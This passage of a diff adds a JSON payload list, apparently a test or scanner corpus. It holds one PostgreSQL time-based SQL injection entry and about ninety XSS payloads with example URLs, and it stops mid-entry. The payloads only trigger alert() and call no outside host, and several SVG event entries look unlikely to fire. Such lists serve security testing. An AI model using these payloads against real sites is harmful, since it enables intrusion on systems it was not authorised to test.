+  {
+    "id": "sqli-099",
+    "description": "Using OR with sleep for time delay in PostgreSQL with double dash comment",
+    "payload": "' OR pg_sleep(15)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(15)--"
+  },
+  {
+    "id": "xss-001",
+    "description": "Basic reflected XSS with script tag",
+    "payload": "<script>alert('XSS1')</script>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/search?q=<script>alert('XSS1')</script>"
+  },
+  {
+    "id": "xss-002",
+    "description": "Reflected XSS with image tag and onerror event",
+    "payload": "<img src=x onerror=alert('XSS2')>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/search?q=<img src=x onerror=alert('XSS2')>"
+  },
+  {
+    "id": "xss-003",
+    "description": "Stored XSS with script tag in comment field",
+    "payload": "<script>alert('XSS3')</script>",
+    "context": "Comment input",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "Submitting comment: <script>alert('XSS3')</script>"
+  },
+  {
+    "id": "xss-004",
+    "description": "Reflected XSS with javascript: URI in anchor tag",
+    "payload": "<a href='javascript:alert(\"XSS4\")'>click</a>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?link=<a href='javascript:alert(\"XSS4\")'>click</a>"
+  },
+  {
+    "id": "xss-005",
+    "description": "Reflected XSS with input tag and onfocus event",
+    "payload": "<input autofocus onfocus=alert('XSS5')>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/search?q=<input autofocus onfocus=alert('XSS5')>"
+  },
+  {
+    "id": "xss-006",
+    "description": "Stored XSS with iframe tag",
+    "payload": "<iframe src='javascript:alert(\"XSS6\")'></iframe>",
+    "context": "User profile bio",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User bio: <iframe src='javascript:alert(\"XSS6\")'></iframe>"
+  },
+  {
+    "id": "xss-007",
+    "description": "Reflected XSS with SVG and onload event",
+    "payload": "<svg onload=alert('XSS7')>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/search?q=<svg onload=alert('XSS7')>"
+  },
+  {
+    "id": "xss-008",
+    "description": "Reflected XSS with body tag and onload event",
+    "payload": "<body onload=alert('XSS8')>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<body onload=alert('XSS8')>"
+  },
+  {
+    "id": "xss-009",
+    "description": "Stored XSS with event handler in div tag",
+    "payload": "<div onclick=alert('XSS9')>Click me</div>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <div onclick=alert('XSS9')>Click me</div>"
+  },
+  {
+    "id": "xss-010",
+    "description": "Reflected XSS with meta refresh tag",
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS10\")'>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS10\")'>"
+  },
+  {
+    "id": "xss-012",
+    "description": "Reflected XSS with script tag and encoded payload",
+    "payload": "%3Cscript%3Ealert('XSS12')%3C/script%3E",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/search?q=%3Cscript%3Ealert('XSS12')%3C/script%3E"
+  },
+  {
+    "id": "xss-013",
+    "description": "Stored XSS with onmouseover event in span tag",
+    "payload": "<span onmouseover=alert('XSS13')>Hover me</span>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <span onmouseover=alert('XSS13')>Hover me</span>"
+  },
+  {
+    "id": "xss-014",
+    "description": "Reflected XSS with iframe and srcdoc attribute",
+    "payload": "<iframe srcdoc=\"<script>alert('XSS14')</script>\"></iframe>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<iframe srcdoc=\"<script>alert('XSS14')</script>\"></iframe>"
+  },
+  {
+    "id": "xss-015",
+    "description": "Reflected XSS with object tag and data attribute",
+    "payload": "<object data='javascript:alert(\"XSS15\")'></object>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<object data='javascript:alert(\"XSS15\")'></object>"
+  },
+  {
+    "id": "xss-016",
+    "description": "Stored XSS with form tag and onsubmit event",
+    "payload": "<form onsubmit=alert('XSS16')><input type='submit'></form>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <form onsubmit=alert('XSS16')><input type='submit'></form>"
+  },
+  {
+    "id": "xss-017",
+    "description": "Reflected XSS with video tag and onerror event",
+    "payload": "<video src=x onerror=alert('XSS17')></video>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<video src=x onerror=alert('XSS17')></video>"
+  },
+  {
+    "id": "xss-018",
+    "description": "Reflected XSS with audio tag and onerror event",
+    "payload": "<audio src=x onerror=alert('XSS18')></audio>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<audio src=x onerror=alert('XSS18')></audio>"
+  },
+  {
+    "id": "xss-019",
+    "description": "Stored XSS with textarea and onfocus event",
+    "payload": "<textarea onfocus=alert('XSS19')>Focus me</textarea>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <textarea onfocus=alert('XSS19')>Focus me</textarea>"
+  },
+  {
+    "id": "xss-020",
+    "description": "Reflected XSS with math tag and href attribute",
+    "payload": "<math href='javascript:alert(\"XSS20\")'>X</math>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<math href='javascript:alert(\"X20\")'>X</math>"
+  },
+  {
+    "id": "xss-021",
+    "description": "Reflected XSS with base tag and href attribute",
+    "payload": "<base href=\"javascript:alert('XSS21');//\">",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<base href=\"javascript:alert('XSS21');//\">"
+  },
+  {
+    "id": "xss-022",
+    "description": "Stored XSS with anchor tag and onclick event",
+    "payload": "<a href='#' onclick='alert(\"XSS22\")'>Click me</a>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <a href='#' onclick='alert(\"XSS22\")'>Click me</a>"
+  },
+  {
+    "id": "xss-023",
+    "description": "Reflected XSS with meta tag and content attribute",
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS23\")'>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS23\")'>"
+  },
+  {
+    "id": "xss-024",
+    "description": "Stored XSS with button tag and onclick event",
+    "payload": "<button onclick='alert(\"XSS24\")'>Click</button>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <button onclick='alert(\"XSS24\")'>Click</button>"
+  },
+  {
+    "id": "xss-025",
+    "description": "Reflected XSS with form tag and onreset event",
+    "payload": "<form onreset=alert('XSS25')><input type='reset'></form>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<form onreset=alert('XSS25')><input type='reset'></form>"
+  },
+  {
+    "id": "xss-026",
+    "description": "Stored XSS with marquee tag and onstart event",
+    "payload": "<marquee onstart=alert('XSS26')>Scrolling text</marquee>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <marquee onstart=alert('XSS26')>Scrolling text</marquee>"
+  },
+  {
+    "id": "xss-027",
+    "description": "Reflected XSS with embed tag and src attribute",
+    "payload": "<embed src='javascript:alert(\"XSS27\")'>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<embed src='javascript:alert(\"XSS27\")'>"
+  },
+  {
+    "id": "xss-028",
+    "description": "Stored XSS with bgsound tag and src attribute",
+    "payload": "<bgsound src='javascript:alert(\"XSS28\")'>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <bgsound src='javascript:alert(\"XSS28\")'>"
+  },
+  {
+    "id": "xss-029",
+    "description": "Reflected XSS with xml tag and onload event",
+    "payload": "<xml onload=alert('XSS29')>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<xml onload=alert('XSS29')>"
+  },
+  {
+    "id": "xss-031",
+    "description": "Reflected XSS using SVG with animate element and begin attribute",
+    "payload": "<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>"
+  },
+  {
+    "id": "xss-032",
+    "description": "Stored XSS using JavaScript URI in base tag",
+    "payload": "<base href=\"javascript:alert('XSS32');//\">",
+    "context": "User profile input",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User profile: <base href=\"javascript:alert('XSS32');//\">"
+  },
+  {
+    "id": "xss-033",
+    "description": "Reflected XSS using malformed iframe with srcdoc and encoded script",
+    "payload": "<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>"
+  },
+  {
+    "id": "xss-034",
+    "description": "Stored XSS using onpointerover event in div",
+    "payload": "<div onpointerover='alert(\"XSS34\")'>Hover me</div>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <div onpointerover='alert(\"XSS34\")'>Hover me</div>"
+  },
+  {
+    "id": "xss-035",
+    "description": "Reflected XSS using malformed script tag with backticks",
+    "payload": "<script>alert(XSS35)</script>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<script>alert(XSS35)</script>"
+  },
+  {
+    "id": "xss-036",
+    "description": "Stored XSS using SVG foreignObject with embedded HTML and script",
+    "payload": "<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>"
+  },
+  {
+    "id": "xss-037",
+    "description": "Reflected XSS using onanimationstart event in div",
+    "payload": "<div style='animation-name:x' onanimationstart='alert(\"XSS37\")'>Test</div>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<div style='animation-name:x' onanimationstart='alert(\"XSS37\")'>Test</div>"
+  },
+  {
+    "id": "xss-038",
+    "description": "Stored XSS using input tag with oninput event",
+    "payload": "<input oninput='alert(\"XSS38\")'>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <input oninput='alert(\"XSS38\")'>"
+  },
+  {
+    "id": "xss-039",
+    "description": "Reflected XSS using malformed script with template literals",
+    "payload": "<script>eval(alert('XSS39'))</script>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<script>eval(alert('XSS39'))</script>"
+  },
+  {
+    "id": "xss-040",
+    "description": "Stored XSS using object tag with data URI",
+    "payload": "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
+  },
+  {
+    "id": "xss-041",
+    "description": "Reflected XSS using onpointerdown event in span",
+    "payload": "<span onpointerdown='alert(\"XSS41\")'>Click me</span>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<span onpointerdown='alert(\"XSS41\")'>Click me</span>"
+  },
+  {
+    "id": "xss-042",
+    "description": "Stored XSS using math tag with href attribute and javascript URI",
+    "payload": "<math href='javascript:alert(\"XSS42\")'>X</math>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <math href='javascript:alert(\"XSS42\")'>X</math>"
+  },
+  {
+    "id": "xss-043",
+    "description": "Reflected XSS using iframe with sandbox attribute bypass",
+    "payload": "<iframe sandbox='allow-scripts' srcdoc='<script>alert(\"XSS43\")</script>'></iframe>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<iframe sandbox='allow-scripts' srcdoc='<script>alert(\"XSS43\")</script>'></iframe>"
+  },
+  {
+    "id": "xss-044",
+    "description": "Stored XSS using video tag with oncanplay event",
+    "payload": "<video oncanplay='alert(\"XSS44\")'></video>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <video oncanplay='alert(\"XSS44\")'></video>"
+  },
+  {
+    "id": "xss-045",
+    "description": "Reflected XSS using meta tag with refresh and encoded javascript URI",
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript&#58;alert(\"XSS45\")'>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript&#58;alert(\"XSS45\")'>"
+  },
+  {
+    "id": "xss-046",
+    "description": "Stored XSS using svg with set attribute and onbegin event",
+    "payload": "<svg><set attributeName='onbegin' to='alert(\"XSS46\")' begin='0s' dur='1s'/></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg><set attributeName='onbegin' to='alert(\"XSS46\")' begin='0s' dur='1s'/></svg>"
+  },
+  {
+    "id": "xss-047",
+    "description": "Reflected XSS using malformed script with setTimeout",
+    "payload": "<script>setTimeout('alert(\"XSS47\")',0)</script>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<script>setTimeout('alert(\"XSS47\")',0)</script>"
+  },
+  {
+    "id": "xss-048",
+    "description": "Stored XSS using details tag with ontoggle event",
+    "payload": "<details ontoggle='alert(\"XSS48\")'><summary>Click me</summary></details>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <details ontoggle='alert(\"XSS48\")'><summary>Click me</summary</details>"
+  },
+  {
+    "id": "xss-049",
+    "description": "Reflected XSS using input tag with formaction attribute",
+    "payload": "<input formaction='javascript:alert(\"XSS49\")' type='submit'>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<input formaction='javascript:alert(\"XSS49\")' type='submit'>"
+  },
+  {
+    "id": "xss-050",
+    "description": "Stored XSS using svg with animateMotion and onbegin event",
+    "payload": "<svg><animateMotion onbegin='alert(\"XSS50\")' dur='1s' repeatCount='1'/></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg><animateMotion onbegin='alert(\"XSS50\")' dur='1s' repeatCount='1'/></svg>"
+  },
+  {
+    "id": "xss-052",
+    "description": "Stored XSS using iframe with onload and srcdoc",
+    "payload": "<iframe srcdoc='<script>alert(\"XSS52\")</script>' onload='alert(\"XSS52\")'></iframe>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <iframe srcdoc='<script>alert(\"XSS52\")</script>' onload='alert(\"XSS52\")'></iframe>"
+  },
+  {
+    "id": "xss-053",
+    "description": "Reflected XSS using svg with onload and script tag",
+    "payload": "<svg onload='alert(\"XSS53\")'><script>alert('XSS53')</script></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onload='alert(\"XSS53\")'><script>alert('XSS53')</script></svg>"
+  },
+  {
+    "id": "xss-054",
+    "description": "Stored XSS using iframe with src set to javascript URI",
+    "payload": "<iframe src='javascript:alert(\"XSS54\")'></iframe>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <iframe src='javascript:alert(\"XSS54\")'></iframe>"
+  },
+  {
+    "id": "xss-055",
+    "description": "Reflected XSS using object tag with type attribute and data URI",
+    "payload": "<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
+  },
+  {
+    "id": "xss-057",
+    "description": "Reflected XSS using iframe with srcdoc and encoded script",
+    "payload": "<iframe srcdoc=\"&lt;script&gt;alert('XSS57')&lt;/script&gt;\"></iframe>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<iframe srcdoc=\"&lt;script&gt;alert('XSS57')&lt;/script&gt;\"></iframe>"
+  },
+  {
+    "id": "xss-058",
+    "description": "Stored XSS using svg with animateTransform and onbegin event",
+    "payload": "<svg><animateTransform attributeName='onbegin' to='alert(\"XSS58\")' begin='0s' dur='1s'/></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg><animateTransform attributeName='onbegin' to='alert(\"XSS58\")' begin='0s' dur='1s'/></svg>"
+  },
+  {
+    "id": "xss-059",
+    "description": "Reflected XSS using script tag with Function constructor",
+    "payload": "<script>Function('alert(\"XSS59\")')()</script>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<script>Function('alert(\"XSS59\")')()</script>"
+  },
+  {
+    "id": "xss-061",
+    "description": "Reflected XSS using SVG with feImage and onload event",
+    "payload": "<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>"
+  },
+  {
+    "id": "xss-062",
+    "description": "Stored XSS using details tag with ontoggle event and script",
+    "payload": "<details ontoggle='alert(\"XSS62\")'><summary>Click me</summary></details>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <details ontoggle='alert(\"XSS62\")'><summary>Click me</summary></details>"
+  },
+  {
+    "id": "xss-063",
+    "description": "Reflected XSS using math tag with href attribute and javascript URI",
+    "payload": "<math href='javascript:alert(\"XSS63\")'>X</math>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<math href='javascript:alert(\"XSS63\")'>X</math>"
+  },
+  {
+    "id": "xss-064",
+    "description": "Stored XSS using audio tag with onerror event",
+    "payload": "<audio src='x' onerror='alert(\"XSS64\")'></audio>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <audio src='x' onerror='alert(\"XSS64\")'></audio>"
+  },
+  {
+    "id": "xss-065",
+    "description": "Reflected XSS using iframe with srcdoc and onload event",
+    "payload": "<iframe srcdoc='<script>alert(\"XSS65\")</script>' onload='alert(\"XSS65\")'></iframe>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<iframe srcdoc='<script>alert(\"XSS65\")</script>' onload='alert(\"XSS65\")'></iframe>"
+  },
+  {
+    "id": "xss-066",
+    "description": "Stored XSS using svg with animateMotion and onbegin event",
+    "payload": "<svg><animateMotion onbegin='alert(\"XSS66\")' dur='1s' repeatCount='1'/></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg><animateMotion onbegin='alert(\"XSS66\")' dur='1s' repeatCount='1'/></svg>"
+  },
+  {
+    "id": "xss-067",
+    "description": "Reflected XSS using input tag with oninvalid event",
+    "payload": "<input oninvalid='alert(\"XSS67\")' required>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<input oninvalid='alert(\"XSS67\")' required>"
+  },
+  {
+    "id": "xss-068",
+    "description": "Stored XSS using iframe with allow attribute and srcdoc",
+    "payload": "<iframe allow='scripts' srcdoc='<script>alert(\"XSS68\")</script>'></iframe>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <iframe allow='scripts' srcdoc='<script>alert(\"XSS68\")</script>'></iframe>"
+  },
+  {
+    "id": "xss-069",
+    "description": "Reflected XSS using svg with onfocusin event",
+    "payload": "<svg tabindex='1' onfocusin='alert(\"XSS69\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg tabindex='1' onfocusin='alert(\"XSS69\")'></svg>"
+  },
+  {
+    "id": "xss-070",
+    "description": "Stored XSS using video tag with onpause event",
+    "payload": "<video onpause='alert(\"XSS70\")'></video>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <video onpause='alert(\"XSS70\")'></video>"
+  },
+  {
+    "id": "xss-071",
+    "description": "Reflected XSS using svg with onmouseenter event",
+    "payload": "<svg onmouseenter='alert(\"XSS71\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onmouseenter='alert(\"XSS71\")'></svg>"
+  },
+  {
+    "id": "xss-072",
+    "description": "Stored XSS using form tag with oninput event",
+    "payload": "<form oninput='alert(\"XSS72\")'><input></form>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <form oninput='alert(\"XSS72\")'><input></form>"
+  },
+  {
+    "id": "xss-073",
+    "description": "Reflected XSS using svg with onwheel event",
+    "payload": "<svg onwheel='alert(\"XSS73\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onwheel='alert(\"XSS73\")'></svg>"
+  },
+  {
+    "id": "xss-074",
+    "description": "Stored XSS using iframe with allowfullscreen attribute and onload event",
+    "payload": "<iframe allowfullscreen onload='alert(\"XSS74\")'></iframe>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <iframe allowfullscreen onload='alert(\"XSS74\")'></iframe>"
+  },
+  {
+    "id": "xss-075",
+    "description": "Reflected XSS using svg with onanimationend event",
+    "payload": "<svg onanimationend='alert(\"XSS75\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onanimationend='alert(\"XSS75\")'></svg>"
+  },
+  {
+    "id": "xss-076",
+    "description": "Stored XSS using audio tag with onplay event",
+    "payload": "<audio onplay='alert(\"XSS76\")'></audio>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <audio onplay='alert(\"XSS76\")'></audio>"
+  },
+  {
+    "id": "xss-077",
+    "description": "Reflected XSS using svg with onscroll event",
+    "payload": "<svg onscroll='alert(\"XSS77\")' style='overflow:auto;height:10px;'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onscroll='alert(\"XSS77\")' style='overflow:auto;height:10px;'></svg>"
+  },
+  {
+    "id": "xss-078",
+    "description": "Stored XSS using iframe with seamless attribute and onload event",
+    "payload": "<iframe seamless onload='alert(\"XSS78\")'></iframe>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <iframe seamless onload='alert(\"XSS78\")'></iframe>"
+  },
+  {
+    "id": "xss-079",
+    "description": "Reflected XSS using svg with oncut event",
+    "payload": "<svg oncut='alert(\"XSS79\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg oncut='alert(\"XSS79\")'></svg>"
+  },
+  {
+    "id": "xss-080",
+    "description": "Stored XSS using svg with oncopy event",
+    "payload": "<svg oncopy='alert(\"XSS80\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg oncopy='alert(\"XSS80\")'></svg>"
+  },
+  {
+    "id": "xss-081",
+    "description": "Reflected XSS using svg with onpaste event",
+    "payload": "<svg onpaste='alert(\"XSS81\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onpaste='alert(\"XSS81\")'></svg>"
+  },
+  {
+    "id": "xss-082",
+    "description": "Stored XSS using svg with onreset event",
+    "payload": "<svg onreset='alert(\"XSS82\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg onreset='alert(\"XSS82\")'></svg>"
+  },
+  {
+    "id": "xss-083",
+    "description": "Reflected XSS using svg with onsearch event",
+    "payload": "<svg onsearch='alert(\"XSS83\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onsearch='alert(\"XSS83\")'></svg>"
+  },
+  {
+    "id": "xss-084",
+    "description": "Stored XSS using svg with onselect event",
+    "payload": "<svg onselect='alert(\"XSS84\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg onselect='alert(\"XSS84\")'></svg>"
+  },
+  {
+    "id": "xss-085",
+    "description": "Reflected XSS using svg with onshow event",
+    "payload": "<svg onshow='alert(\"XSS85\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onshow='alert(\"XSS85\")'></svg>"
+  },
+  {
+    "id": "xss-086",
+    "description": "Stored XSS using svg with ontoggle event",
+    "payload": "<svg ontoggle='alert(\"XSS86\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg ontoggle='alert(\"XSS86\")'></svg>"
+  },
+  {
+    "id": "xss-087",
+    "description": "Reflected XSS using svg with ontransitionend event",
+    "payload": "<svg ontransitionend='alert(\"XSS87\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg ontransitionend='alert(\"XSS87\")'></svg>"
+  },
+  {
+    "id": "xss-088",
+    "description": "Stored XSS using svg with onunload event",
+    "payload": "<svg onunload='alert(\"XSS88\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg onunload='alert(\"XSS88\")'></svg>"
+  },
+  {
+    "id": "xss-089",
+    "description": "Reflected XSS using svg with onvolumechange event",
+    "payload": "<svg onvolumechange='alert(\"XSS89\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onvolumechange='alert(\"XSS89\")'></svg>"
+  },
+  {
+    "id": "xss-090",
+    "description": "Stored XSS using svg with onwaiting event",
+    "payload": "<svg onwaiting='alert(\"XSS90\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg onwaiting='alert(\"XSS90\")'></svg>"
+  },
+  {
+    "id": "xss-091",
+    "description": "Reflected XSS using svg with onwheel event and CSS animation",
+    "payload": "<svg onwheel='alert(\"XSS91\")' style='animation:spin 1s linear infinite'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onwheel='alert(\"XSS91\")' style='animation:spin 1s linear infinite'></svg>"
+  },
+  {
+    "id": "xss-092",
+    "description": "Stored XSS using svg with onpointercancel event",
+    "payload": "<svg onpointercancel='alert(\"XSS92\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg onpointercancel='alert(\"XSS92\")'></svg>"
+  },
+  {
+    "id": "xss-093",
+    "description": "Reflected XSS using svg with onpointerout event",
+    "payload": "<svg onpointerout='alert(\"XSS93\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onpointerout='alert(\"XSS93\")'></svg>"
+  },
+  {
+    "id": "xss-094",
+    "description": "Stored XSS using svg with onpointerover event",
+    "payload": "<svg onpointerover='alert(\"XSS94\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg onpointerover='alert(\"XSS94\")'></svg>"
+  },
+  {
+    "id": "xss-095",
+    "description": "Reflected XSS using svg with onpointerup event",
+    "payload": "<svg onpointerup='alert(\"XSS95\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onpointerup='alert(\"XSS95\")'></svg>"
+  },
+  {
+    "id": "xss-096",
+    "description": "Stored XSS using svg with onselectstart event",
+    "payload": "<svg onselectstart='alert(\"XSS96\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg onselectstart='alert(\"XSS96\")'></svg>"
+  },
+  {
+    "id": "xss-097",
+    "description": "Reflected XSS using svg with onshow event and tabindex",
